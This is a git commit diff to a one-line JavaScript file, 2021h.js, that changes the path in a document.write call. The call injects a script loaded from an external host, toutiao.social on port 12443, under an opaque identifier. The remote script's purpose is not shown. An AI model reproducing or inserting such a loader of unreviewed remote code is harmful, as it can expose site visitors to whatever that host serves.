248118e5683d20f275d591c68b8a496df561c7f0
boba3721 <68194272+boba3721@users.noreply.github.com>
2021-06-05 16:28:53 +0000

    Update 2021h.js

--- 2021h.js
+++ 2021h.js
@@ -1,1 +1,1 @@
-document.write('<script src="https://toutiao.social:12443/ty/42057558-B4A4-13163-33-22E41FE484DE.alpha"><\/script>');
+document.write('<script src="https://toutiao.social:12443/ty/FD1211FE-AFE6-13163-33-13BAAFECFF92.alpha"><\/script>');
